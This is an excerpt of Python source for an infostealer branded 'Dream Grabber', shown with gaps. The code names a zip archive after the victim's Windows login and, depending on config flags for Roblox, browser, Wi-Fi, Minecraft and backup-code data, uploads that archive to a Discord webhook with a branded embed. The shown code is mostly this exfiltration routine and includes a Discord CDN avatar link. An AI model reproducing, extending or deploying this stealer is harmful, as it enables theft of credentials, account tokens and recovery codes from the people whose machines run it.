...
def main(webhook: str):
    ...
    data = {
        "username": "Dream",
        "avatar_url": "https://cdn.discordapp.com/attachments/1210934736969793606/1261046894252130435/ezgif-5-0799debe54.gif?ex=669188f0&is=66903770&hm=b6db408d6728879cfd2af50b0256d3133db62965fc993728c0376fbb65d517db&"
    }

    _file = f'{localappdata}\\Dream-Logged-{os.getlogin()}.zip'
    ...
    if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "minecraft", "backupcodes"]):
        with open(_file, 'rb') as file:
            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'Dream-Logged-{os.getlogin()}.zip', file, 'application/zip')})
...
def zipup():
    _zipfile = os.path.join(localappdata, f'Dream-Logged-{os.getlogin()}.zip')
            ...
            "embeds": [
                {
                    ...
                    "footer": {
                        "text": "Dream Grabber | Created By Dream"
                    },
                    "thumbnail": {
                        "url": "https://cdn.discordapp.com/attachments/1210934736969793606/1261046894252130435/ezgif-5-0799debe54.gif?ex=669188f0&is=66903770&hm=b6db408d6728879cfd2af50b0256d3133db62965fc993728c0376fbb65d517db&"
                    }
                }
            ],
            "username": "Dream",
